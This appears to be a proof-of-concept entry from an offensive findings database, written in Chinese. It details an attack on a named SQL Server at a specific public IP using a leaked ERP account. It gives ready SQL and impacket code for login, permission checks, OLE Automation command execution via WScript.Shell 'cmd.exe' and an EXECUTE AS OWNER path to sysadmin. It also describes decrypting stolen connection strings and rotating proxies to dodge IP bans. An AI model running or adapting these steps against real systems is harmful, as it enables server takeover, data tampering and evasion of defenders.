# SQL Server 1433 应用账号越权边界：db_owner + serveradmin + OLE Automation 可创建 WScript.Shell（服务账户命令执行原语）

- **code**: mssql-appaccount-dbowner-serveradmin-ole-automation-exec
- **kind**: poc
- **category**: privesc
- **component**: Microsoft SQL Server 2014 SP2-GDR (12.0.5223.6) / Exchequer ERP 集成账号
- **severity**: high
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11T22:44Z~23:10Z（task#4，finding#181）在 90.152.8.56:1433（PRELOGIN 版本字段 0c0014670000 → 12.0.5223.6，@@SERVERNAME=PUPPY）实测：① TDS LOGIN7（database=master，EXCHEQUER_ADMIN）返回 LOGINACK，errors 为空；② USE Exchequer 后 IS_MEMBER('db_owner')=1、USER_NAME()=common、HAS_PERMS_BY_NAME('Exchequer','DATABASE',CONTROL/INSERT/UPDATE/DELETE/EXECUTE) 全为 1；③ 服务器级 IS_SRVROLEMEMBER('serveradmin')=1、sysadmin=0、HAS_PERMS_BY_NAME(NULL,NULL,'ALTER SETTINGS')=1、VIEW SERVER STATE=1；④ BEGIN TRAN + UPDATE Exchequer.common.COMPANY SET [RecPfix]=[RecPfix] WHERE 1=0 返回 rc=0 且无 229/权限错误，随后 ROLLBACK（未改任何数据）；⑤ sp_OACreate 'WScript.Shell' 与 'Scripting.FileSystemObject' 均返回 hr=0、obj=16711422，负控 'ZZQ.NoSuch.ProgID.9f3' 返回 hr=-2147221005 (0x800401F3)、obj=NULL —— 负控证明不是「任意 ProgID 都回 0」的解析假象；⑥ sys.dm_server_services 返回 3 行，服务账户均为 NT Service\* 虚拟账户，sqlservr.exe 位于 MSSQL12.MSSQLSERVER\MSSQL\Binn。据此判定「应用集成账号 = 库级完全控制 + 服务器 serveradmin + 可执行的 OLE 命令原语」成立；按纪律未调用 sp_OAMethod Run，故 OS 命令执行标注为原语级（未落地执行），db_owner→sysadmin 的 EXECUTE AS OWNER 提升面亦未执行。
- **path**: pocs/mssql-appaccount-dbowner-serveradmin-ole-automation-exec/poc.md
- **tags**: mssql,1433,tds,db_owner,serveradmin,ole-automation,sp_OACreate,WScript.Shell,impacket,erp,privilege-boundary
- **created_at**: 2026-11-12T01:48:15.833Z
- **engine**: 90.152.8.56:1433

## 描述

应用配置里导出的 SQL 登录账号在目标实例上并非普通账号：业务库 db_owner（CONTROL/INSERT/UPDATE/DELETE/EXECUTE 全开）+ 服务器 serveradmin + Ole Automation 已启用且 sp_OACreate 可创建 WScript.Shell/Scripting.FileSystemObject（无效 ProgID 负控失败），构成以 SQL 服务账户执行命令的原语。给出从 TDS 指纹、登录、权限判据、写权限事务干跑、OLE 正负控到服务账户枚举的完整可复现步骤与误判清单。

## 正文

```
# 一句话
可用的 SQL 登录账号（来自 ERP 应用配置，非 DBA 专用）在目标实例上同时是业务库 `db_owner` 与服务器 `serveradmin`，且 Ole Automation Procedures 已启用、`sp_OACreate` 可创建 `WScript.Shell` —— 无需 sysadmin 即拿到以 SQL 服务账户执行命令的原语。

## 0. 适用/指纹
- 端口 tcp/1433；TDS PRELOGIN 响应版本字段 `0c 00 14 67 00 00`（小端 `0x6714000c` 拆解为 12.0.5223）→ SQL Server 2014 SP2-GDR 12.0.5223.6；`@@SERVERNAME` = PUPPY。
- 账号形态：形如 `EXCHEQUER_ADMIN` 的 ERP 集成账号，口令可能含 `~` 等特殊字符，必须原样传（别过 shell 变量展开）。
- 常见来源链：同主机 NFS 匿名导出 → `Ent/ExchSQLLogin.xml` + `ExchSQLDAL.dll`，离线用 RC4 密钥 `MD5('wmie@iris!')` 解出连接串（同库另有该链的独立条目）。

## 1. 前置
- 能直连 1433 的出口（公共 HTTP CONNECT 也可；每个新出口的首个 TCP 会话成功率最高，固定出口会被 IP 级封禁）。
- impacket（`pip install impacket`）或 sqlcmd/SSMS。
- 只读优先；写验证必须放事务里 `WHERE 1=0` 后 `ROLLBACK`。

## 2. Step 1 —— 可达性与真实指纹
```python
from impacket.mssql import MSSQL
ms = MSSQL('90.152.8.56', 1433)
ms.connect()          # 内含 PRELOGIN
ms.login('master', 'EXCHEQUER_ADMIN', '<PASSWORD>')
print(ms.errors)      # 必须为空
```
```bash
sqlcmd -S 90.152.8.56,1433 -U EXCHEQUER_ADMIN -P '<PASSWORD>' -d master \
       -Q "SELECT @@VERSION AS v, @@SERVERNAME AS srv"
```
判据：
- PRELOGIN 有响应且版本与 `@@VERSION` 一致（本目标 12.0.5223.6）。若 PRELOGIN 15s 无响应、或版本对不上（例如假回 15.0.4153 而行为不符），先按「1433 防火墙握手代理式伪装」处理，换出口，别急着爆破。
- `LOGINACK` 成功、`ms.errors` 为空；`@@SERVERNAME=PUPPY`。

## 3. Step 2 —— 库级权限（db_owner 判据）
```sql
USE Exchequer;
SELECT IS_MEMBER('db_owner') AS dbo, USER_NAME() AS u,
       HAS_PERMS_BY_NAME('Exchequer','DATABASE','CONTROL') AS ctrl,
       HAS_PERMS_BY_NAME('Exchequer','DATABASE','INSERT')  AS ins,
       HAS_PERMS_BY_NAME('Exchequer','DATABASE','UPDATE')  AS upd,
       HAS_PERMS_BY_NAME('Exchequer','DATABASE','DELETE')  AS del,
       HAS_PERMS_BY_NAME('Exchequer','DATABASE','EXECUTE') AS exe;
```
本目标回显：`dbo=1, u=common, ctrl=1, ins=1, upd=1, del=1, exe=1`。
注意 `USER_NAME()` 返回 `common`（登录名到库用户的映射名），后续库内对象都在 `common` schema。

顺手看属主（决定 db_owner→sysadmin 路线）：
```sql
SELECT name, SUSER_SNAME(owner_sid) AS owner_login FROM sys.databases;
```
本目标：`Exchequer` 的 dbo 映射到隐藏 Windows 登录 `PUPPY\Administrator`。

## 4. Step 3 —— 服务器级角色/权限
```sql
SELECT IS_SRVROLEMEMBER('serveradmin') AS r_serveradmin,
       IS_SRVROLEMEMBER('sysadmin')    AS r_sysadmin,
       HAS_PERMS_BY_NAME(NULL,NULL,'ALTER SETTINGS')     AS alter_settings,
       HAS_PERMS_BY_NAME(NULL,NULL,'VIEW SERVER STATE')  AS vss,
       HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER')     AS control_server;
```
本目标：`serveradmin=1, sysadmin=0, ALTER SETTINGS=1, VIEW SERVER STATE=1, CONTROL SERVER=0`。
判读：serveradmin ≠ sysadmin，但配合 OLE Automation 已足够命令执行；不要停在「不是 sysadmin 就没事」的结论。

## 5. Step 4 —— 写权限干跑（不落数据）
```sql
BEGIN TRANSACTION;
DECLARE @t sysname, @c sysname, @s nvarchar(400);
SELECT TOP 1 @t=TABLE_NAME FROM Exchequer.INFORMATION_SCHEMA.TABLES
 WHERE TABLE_SCHEMA='common' ORDER BY TABLE_NAME;
SELECT TOP 1 @c=COLUMN_NAME FROM Exchequer.INFORMATION_SCHEMA.COLUMNS
 WHERE TABLE_SCHEMA='common' AND TABLE_NAME=@t ORDER BY ORDINAL_POSITION;
SET @s='UPDATE Exchequer.common.['+@t+'] SET ['+@c+']=['+@c+'] WHERE 1=0';
EXEC sp_executesql @s;
SELECT @@ROWCOUNT AS rc, @t AS tbl_used, @c AS col_used;
ROLLBACK TRANSACTION;
```
本目标：`rc=0, tbl=COMPANY, col=RecPfix`，无 229/权限错误 → 具备实际增删改能力（未改任何行）。
失败常见原因：`229` = 只有 SELECT 或缺对象级权限；`@t`/`@c` 为空 = 库名/schema 写错。

## 6. Step 5 —— OLE Automation 原语（关键）
```sql
-- 配置面
SELECT name, value_in_use FROM sys.configurations
 WHERE name IN ('Ole Automation Procedures','xp_cmdshell','show advanced options');

-- 正控：创建 COM 对象
DECLARE @hr int, @o int;
EXEC @hr = sp_OACreate 'WScript.Shell', @o OUTPUT;
SELECT @hr AS hr, @o AS obj;
```
判据：`hr=0` 且 `obj` 为非 0 对象号（本目标 `16711422`；同一实例上对象号可复用，不要求每次不同）。
必须做负控，排除「任意 ProgID 都回 0」的解析假象：
```sql
DECLARE @hr int, @o int;
EXEC @hr = sp_OACreate 'ZZQ.NoSuch.ProgID.9f3', @o OUTPUT;
SELECT @hr AS hr, @o AS obj;
```
本目标负控：`hr=-2147221005 (0x800401F3 invalid class string), obj=NULL`。
再加一个等效对象交叉确认：`sp_OACreate 'Scripting.FileSystemObject'` 同样 `hr=0`。

拿到原语后的执行形态（本次按纪律**未调用**，仅给复现命令）：
```sql
DECLARE @hr int, @o int;
EXEC @hr = sp_OACreate 'WScript.Shell', @o OUTPUT;
EXEC @hr = sp_OAMethod @o, 'Run', NULL, 'cmd.exe /c whoami > C:\Windows\Temp\artx.txt', 0, 0;
EXEC sp_OADestroy @o;
SELECT @hr AS hr;   -- 0 = 已派生
```
回读落在服务账户可写目录（`C:\Windows\Temp` 通常可写；否则换 `%TEMP%` 或 SQL 安装目录下可写路径）。**执行后必须 `sp_OADestroy` 并清理落地文件。**

## 7. Step 6 —— 服务账户与安装路径（VIEW SERVER STATE）
```sql
SELECT servicename, service_account, startup_type_desc, filename
  FROM sys.dm_server_services;
```
本目标 3 行：MSSQLSERVER / SQLSERVERAGENT / MSSQLFDLauncher，均为 `NT Service\*` 虚拟账户；`sqlservr.exe` 位于 `C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERVER\MSSQL\Binn\`。
判读：虚拟账户 = 本机命令执行（非 SYSTEM）；若是域账号，直接升级为横向移动目标（可读服务账户可访问的网络资源）。

## 8. Step 7 —— db_owner → sysadmin 提升面（本目标未执行，仅登记）
当库属主映射到 sysadmin 的 Windows 登录（本目标 `PUPPY\Administrator`）时，经典 `EXECUTE AS OWNER`：
```sql
USE Exchequer;
CREATE PROCEDURE dbo.artx_esc WITH EXECUTE AS OWNER AS
  SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin, SUSER_SNAME() AS ctx;
EXEC dbo.artx_esc;
DROP PROCEDURE dbo.artx_esc;
```
若 `is_sysadmin=1`，过程体内可继续 `EXECUTE AS LOGIN='sa'` 拿 sysadmin（或直接做 sysadmin 才允许的操作）。
判据：过程体内 `IS_SRVROLEMEMBER('sysadmin')=1` 且 `SUSER_SNAME()` 变为属主登录。失败常见原因：库属主是普通登录；过程体不能含 `USE`；`CREATE PROCEDURE` 被拒（db_owner 正常不会）。
优先级：OLE 原语（Step 5）已能执行命令，通常不需要动这个提升面；它的价值是拿完整 sysadmin（改配置、读其他库、留账号）。

## 9. 失败/误判清单
- `18456` 登录失败：先确认口令原样（`~` 等字符别被 shell 吞掉），再确认 `master` 可连；不要急着重置口令。
- `229` on `sp_OACreate`：账号没有该扩展存储过程的 EXECUTE；改走 `EXECUTE AS OWNER`（Step 7）。
- `hr=0` 但后续 `sp_OAMethod` 报错：方法名/参数个数错（`Run` 是 3 参：Command、WindowStyle、WaitOnReturn），不是对象没创建。
- `-2147221005`：ProgID 拼错或系统被裁剪（Server Core/容器常见）。`WScript.Shell` 不可用时试 `Shell.Application`、`Scripting.FileSystemObject`、`WbemScripting.SWbemLocator`。
- `sys.dm_server_services` 报权限：缺 VIEW SERVER STATE。
- xp_cmdshell 已启用 ≠ 本账号能执行：默认只有 sysadmin 有 EXECUTE。`EXEC master..xp_cmdshell 'whoami'` 返回 `229` 不代表 OLE 不可用。
- 同一出口连续打会被 IP 级封禁，表现为 TCP 通但 TDS 无响应 —— 先换出口再判死。

## 10. 一键最小脚本（impacket）
```python
#!/usr/bin/env python3
import sys
from impacket.mssql import MSSQL

HOST, USER, PWD = sys.argv[1], sys.argv[2], sys.argv[3]
DB = sys.argv[4] if len(sys.argv) > 4 else 'master'

def q(ms, sql):
    rows = ms.sql_query(sql, wait=True)
    for r in rows:
        print(list(r) if not hasattr(r, 'keys') else {k: r[k] for k in r.keys()})

ms = MSSQL(HOST, 1433)
ms.connect()
ms.login(DB, USER, PWD)
if ms.errors:
    print('LOGIN ERRORS:', ms.errors); sys.exit(2)

q(ms, "SELECT @@VERSION AS v, @@SERVERNAME AS srv")
q(ms, f"USE {DB}; SELECT IS_MEMBER('db_owner') AS dbo, USER_NAME() AS u")
q(ms, "SELECT IS_SRVROLEMEMBER('serveradmin') r_sa, IS_SRVROLEMEMBER('sysadmin') r_sys, "
       "HAS_PERMS_BY_NAME(NULL,NULL,'ALTER SETTINGS') alter_settings, "
       "HAS_PERMS_BY_NAME(NULL,NULL,'VIEW SERVER STATE') vss")
q(ms, "DECLARE @hr int,@o int; EXEC @hr=sp_OACreate 'WScript.Shell',@o OUTPUT; "
       "SELECT @hr AS hr, @o AS obj")
q(ms, "DECLARE @hr int,@o int; EXEC @hr=sp_OACreate 'ZZQ.NoSuch.ProgID.9f3',@o OUTPUT; "
       "SELECT @hr AS hr, @o AS obj")
q(ms, "SELECT servicename, service_account, filename FROM sys.dm_server_services")
```
行对象类型随 impacket 版本不同（`sqlite3.Row`/tuple），直接 `print(rows)` 也可；关键是看上述判据字段。

## 11. 落地结论模板
> 目标 `<IP>:1433`（SQL Server `<version>`，`@@SERVERNAME=<name>`）上，应用配置导出的账号 `<user>` 在 `<db>` 为 `db_owner`（CONTROL/INSERT/UPDATE/DELETE/EXECUTE=1），服务器级 `serveradmin=1`、`ALTER SETTINGS=1`、`VIEW SERVER STATE=1`；Ole Automation 已启用，`sp_OACreate WScript.Shell` 返回 `hr=0` 且无效 ProgID 负控 `hr=-2147221005`，证明具备以 SQL 服务账户（`<service_account>`）执行命令的原语。写权限以事务内 `WHERE 1=0` 干跑验证、未改数据；未调用 `sp_OAMethod Run`。
```
